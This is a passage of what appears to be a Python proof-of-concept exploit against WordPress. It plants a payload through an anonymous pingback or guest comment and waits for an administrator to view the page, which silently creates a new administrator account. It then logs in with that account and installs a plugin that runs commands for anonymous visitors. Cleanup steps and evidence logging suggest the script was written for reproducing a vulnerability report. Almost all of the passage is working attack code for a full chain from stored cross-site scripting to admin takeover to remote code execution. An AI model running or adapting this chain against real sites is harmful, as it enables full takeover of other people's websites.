                    "author_url": pingback.get("author_url"),
                    "database_user_id": pingback.get("database_user_id"),
                    "database_user_id_note": pingback.get("database_user_id_note"),
                    "public_rest_author_id": pingback.get("public_rest_author_id"),
                    "anonymous_request": evidence["submission"]["request_cookie_free"],
                    "discovery_basis": pingback.get("discovery_basis"),
                    "transport_nonce_present": (
                        "n=" + source_preflight["selected"]["transport_nonce"]
                        in html.unescape(str(pingback.get("author_url") or ""))
                    ),
                }
                if not all(
                    (
                        evidence["submission"]["request_cookie_free"],
                        evidence["public_pingback"]["publicly_rendered"] is True,
                        (
                            evidence["public_pingback"]["public_type_class"] == "pingback"
                            or evidence["public_pingback"]["public_rest_type"] == "pingback"
                        ),
                        evidence["public_pingback"]["post"] == target_post_id,
                        evidence["public_pingback"]["transport_nonce_present"],
                    )
                ):
                    raise ProofError(
                        "Pingback was not public, anonymous, and bound to the target"
                    )
            else:
                if args.comment_flood_wait_seconds:
                    time.sleep(args.comment_flood_wait_seconds)
                evidence["submission"] = submit_comment(
                    guest,
                    base,
                    target_post_id,
                    content,
                    approved_identity["author"],
                    approved_identity["email"],
                    args.comment_url,
                )
                evidence["submission"]["identity_mode"] = approved_identity["mode"]
                evidence["submission"]["source_comment_id"] = approved_identity.get(
                    "comment_id"
                )
                comment_id = evidence["submission"].get("comment_id")
        finally:
            guest.close()
        log_progress(
            "Guest artifact submitted: "
            + ("anonymous pingback" if delivery_branch == "classic_pingback_mediaelement" else "guest comment")
        )
        anonymous = http_session(base)
        try:
            public = anonymous.get(target_visit_url, timeout=60)
            public_comment = (
                anonymous.get(
                    base + "/?rest_route=/wp/v2/comments/" + str(comment_id),
                    timeout=30,
                )
                if comment_id is not None
                and delivery_branch == "block_theme_guest_comment_oembed"
                else None
            )
        finally:
            anonymous.close()
        if delivery_branch == "classic_pingback_mediaelement":
            decoded_public = html.unescape(public.text)
            installer_widget_block_4 = bool(
                re.search(r"\bid=[\"']block-4[\"']", public.text, re.I)
            )
            live_latest_comments_list = bool(
                re.search(
                    r"<(?:ol|ul)\b[^>]*\bclass=[\"'][^\"']*"
                    r"\bwp-block-latest-comments\b",
                    public.text,
                    re.I,
                )
            )
            evidence["anonymous_public_surface"] = {
                "status": public.status_code,
                "installer_widget_block_4": installer_widget_block_4,
                "live_latest_comments_list": live_latest_comments_list,
                "public_recent_comments_renderer": (
                    installer_widget_block_4 or live_latest_comments_list
                ),
                "mediaelement_loader_video": "wp-video-shortcode" in public.text,
                "mediaelement_script": "mediaelement-and-player" in public.text,
                "live_track": bool(
                    re.search(r"<track\b[^>]*\blabel=", decoded_public, re.I)
                ),
                "track_label_sink": evidence["carrier"]["browser_sink"]
                in decoded_public,
            }
            if not all(
                (
                    evidence["anonymous_public_surface"]["status"] == 200,
                    evidence["anonymous_public_surface"][
                        "public_recent_comments_renderer"
                    ],
                    evidence["anonymous_public_surface"]["mediaelement_loader_video"],
                    evidence["anonymous_public_surface"]["mediaelement_script"],
                    evidence["anonymous_public_surface"]["live_track"],
                    evidence["anonymous_public_surface"]["track_label_sink"],
                )
            ):
                raise ProofError(
                    "Supported classic widget renderer did not materialize the pingback "
                    "MediaElement carrier"
                )
        else:
            public_comment_body = (
                public_comment.json()
                if public_comment is not None and public_comment.status_code == 200
                else {}
            )
            evidence["anonymous_public_comment"] = {
                "status": public_comment.status_code if public_comment is not None else None,
                "type": public_comment_body.get("type"),
                "post": public_comment_body.get("post"),
                "marker_present": marker
                in public_comment_body.get("content", {}).get("rendered", ""),
            }
            if not (
                evidence["anonymous_public_comment"]["status"] == 200
                and evidence["anonymous_public_comment"]["type"] == "comment"
                and evidence["anonymous_public_comment"]["post"] == target_post_id
                and evidence["anonymous_public_comment"]["marker_present"] is True
            ):
                raise ProofError(
                    "Guest payload was not publicly approved as an ordinary comment"
                )
            position = public.text.find("wp-embedded-content")
            evidence["anonymous_public_surface"] = {
                "status": public.status_code,
                "marker_present": marker in public.text,
                "iframe_present": position >= 0,
                "sandbox_allow_scripts": 'sandbox="allow-scripts"' in public.text,
                "bounded_embed": public.text[
                    max(0, position - 250) : position + 850
                ]
                if position >= 0
                else "",
            }
            if (
                not evidence["anonymous_public_surface"]["marker_present"]
                or position < 0
            ):
                raise ProofError(
                    "Guest comment was not publicly autoapproved and rendered as an oEmbed"
                )
        trigger_exposed = True
        visit_url = target_visit_url
        evidence["trigger"] = {
            "mode": "tester_admin_browser",
            "administrator_visit_url": visit_url,
            "poll_interval_seconds": args.poll_interval_seconds,
            "timeout_seconds": args.trigger_timeout_seconds,
        }
        log_info("Payload live — in your own logged-in Administrator browser, load:")
        print(f"    {visit_url}", file=sys.stderr, flush=True)
        log_progress(
            f"Polling the generated credential every {args.poll_interval_seconds}s; "
            "no click required after the page loads"
        )
        last_error = None
        attempts = 0
        wait_started = time.monotonic()
        deadline = wait_started + args.trigger_timeout_seconds
        while True:
            attempts += 1
            try:
                injected_admin = authenticate_admin(base, username, password)
                break
            except Exception as exc:
                last_error = exc
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                log_progress(
                    "Trigger not observed; next check in "
                    f"{min(args.poll_interval_seconds, int(remaining))}s"
                )
                time.sleep(min(args.poll_interval_seconds, max(0, remaining)))
        evidence["trigger"]["poll_attempts"] = attempts
        evidence["trigger"]["observed_after_seconds"] = round(time.monotonic() - wait_started, 3)
        if injected_admin is None:
            evidence["trigger"]["last_authentication_error"] = (
                f"{type(last_error).__name__}: {last_error}" if last_error else None
            )
            raise ProofError("Created Administrator credential was not usable") from last_error
        log_ok(f"Generated Administrator credential accepted after {attempts} poll(s)")
        with state.lock:
            events = list(state.events)
        marker_events = [item for item in events if item.get("marker") == marker]
        provider_paths = (
            ("/bounce",)
            if delivery_branch == "classic_pingback_mediaelement"
            else ("/doc", "/api", "/frame", "/bounce")
        )
        hosts_by_path = {
            path: sorted({item.get("host") for item in marker_events if item.get("path") == path})
            for path in provider_paths
        }
        browser_events = [item for item in marker_events if item.get("path") in ("/frame", "/bounce")]
        evidence["provider_boundary"] = {
            "hosts_by_path": hosts_by_path,
            "browser_hops_cross_site": bool(browser_events) and all(item.get("sec_fetch_site") == "cross-site" for item in browser_events),
            "browser_hops_cookie_free": bool(browser_events) and all(not item.get("cookie_present") for item in browser_events),
        }
        expected = (
            {"/bounce": [urlsplit(browser_origin).netloc]}
            if delivery_branch == "classic_pingback_mediaelement"
            else {
                "/doc": [urlsplit(provider_origin).netloc],
                "/api": [urlsplit(provider_origin).netloc],
                "/frame": [urlsplit(browser_origin).netloc],
                "/bounce": [urlsplit(browser_origin).netloc],
            }
        )
        if hosts_by_path != expected or not evidence["provider_boundary"]["browser_hops_cross_site"] or not evidence["provider_boundary"]["browser_hops_cookie_free"]:
            raise ProofError("Provider origin/cookie boundary evidence was incomplete")
        evidence["takeover"] = {"created_administrator_authenticated": True}
        slug, archive = build_plugin()
        candidate_plugin_file = slug + "/marker.php"
        plugins_before = injected_admin.get(base + "/wp-admin/plugins.php", timeout=30)
        evidence["plugin_path_absent_before"] = candidate_plugin_file not in plugins_before.text
        if not evidence["plugin_path_absent_before"]:
            raise ProofError("Generated proof plugin path already existed")
        plugin_file = candidate_plugin_file
        evidence["plugin_install"] = upload_and_activate(injected_admin, base, slug, archive)
        log_ok(f"Proof plugin active: wp-content/plugins/{plugin_file}")
        log_info(f"Proof URL: {base}/?wprc_proof=1")
        evidence["command_marker"] = anonymous_marker(base)
        if not evidence["command_marker"].get("ran"):
            raise ProofError("Anonymous whoami marker did not return command output")
        chain_complete = True
        log_ok("Anonymous command execution confirmed")
    except Exception as exc:
        evidence["error"] = f"{type(exc).__name__}: {exc}"
    finally:
        manual_cleanup_items: list[str] = []
        cleanup_admin = injected_admin if args.cleanup else None
        if plugin_file:
            if cleanup_admin is not None:
                try:
                    evidence["plugin_cleanup"] = cleanup_plugin(
                        cleanup_admin, base, plugin_file
                    )
                except Exception as exc:
                    evidence["plugin_cleanup"] = {
                        "completed": False,
                        "error": f"{type(exc).__name__}: {exc}",
                    }
            else:
                evidence["plugin_cleanup"] = {"completed": False}
            if evidence["plugin_cleanup"].get("completed") is not True:
                instruction = f"Remove temporary plugin {plugin_file} if it is present."
                evidence["plugin_cleanup"].update(
                    {"manual_required": True, "instruction": instruction}
                )
                manual_cleanup_items.append(instruction)

        if plugin_file is None:
            evidence["oembed_cache_cleanup"] = {
                "completed": True,
                "not_applicable": True,
                "reason": "proof plugin was never installed",
            }
        elif args.cleanup and evidence.get("plugin_cleanup", {}).get("completed") is True:
            evidence["oembed_cache_cleanup"] = {
                "completed": True,
                "method": "plugin uninstall hook",
            }
        else:
            instruction = (
                "Clear the reproduction oEmbed cache (_oembed_* post meta) on "
                f"target post {target_post_id}, or discard the disposable database."
            )
            evidence["oembed_cache_cleanup"] = {
                "completed": False,
                "manual_required": True,
                "instruction": instruction,
            }
            manual_cleanup_items.append(instruction)

        if comment_attempted:
            if cleanup_admin is not None:
                try:
                    evidence["comment_cleanup"] = cleanup_comment(
                        cleanup_admin, base, comment_id, comment_cleanup_marker
                    )
                except Exception as exc:
                    evidence["comment_cleanup"] = {
                        "completed": False,
                        "comment_id": comment_id,
                        "error": f"{type(exc).__name__}: {exc}",
                    }
            else:
                evidence["comment_cleanup"] = {
                    "completed": False,
                    "comment_id": comment_id,
                }
            if evidence["comment_cleanup"].get("completed") is not True:
                identity = (
                    f"ID {comment_id}"
                    if comment_id is not None
                    else f"marker {comment_cleanup_marker}"
                )
                instruction = f"Permanently delete the temporary comment identified by {identity}."
                evidence["comment_cleanup"].update(
                    {"manual_required": True, "instruction": instruction}
                )
                manual_cleanup_items.append(instruction)

        if trigger_exposed:
            instruction = (
                "Delete temporary Administrator " + username
                + " if it is present in the tester's existing wp-admin session."
            )
            evidence["user_cleanup"] = {
                "completed": False,
                "username": username,
                "expected_email": email,
                "manual_required": True,
                "instruction": instruction,
            }
            manual_cleanup_items.append(instruction)
        else:
            evidence["user_cleanup"] = {
                "completed": True,
                "not_needed": True,
                "reason": "trigger was not exposed",
            }

        if injected_admin is not None:
            injected_admin.close()
        evidence["provider_cleanup"] = stop_provider(servers, threads)
        evidence["chain_complete"] = chain_complete
        plugin_cleanup_complete = (
            plugin_file is None
            or evidence.get("plugin_cleanup", {}).get("completed") is True
        )
        comment_cleanup_complete = (
            not comment_attempted
            or evidence.get("comment_cleanup", {}).get("completed") is True
        )
        user_cleanup_complete = (
            not trigger_exposed
            or evidence.get("user_cleanup", {}).get("completed") is True
        )
        evidence["cleanup_complete"] = bool(
            plugin_cleanup_complete
            and evidence["oembed_cache_cleanup"].get("completed") is True
            and user_cleanup_complete
            and comment_cleanup_complete
            and evidence.get("provider_cleanup", {}).get("threads_stopped") is True
        )
        evidence["manual_cleanup_items"] = manual_cleanup_items
        evidence["manual_cleanup_required"] = bool(manual_cleanup_items)
        evidence["success"] = bool(chain_complete)
        evidence["finished_at"] = utc_now()
    if args.evidence:
        output = Path(args.evidence).expanduser().resolve()
        output.write_text(json.dumps(evidence, indent=2) + "\n", encoding="utf-8")
        log_info(f"Evidence written to {output}")
    for instruction in manual_cleanup_items:
        log_info("Manual cleanup: " + instruction)
    if evidence["success"]:
        log_ok("Chain complete")
        return 0
    log_error(str(evidence.get("error") or "Chain incomplete"))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
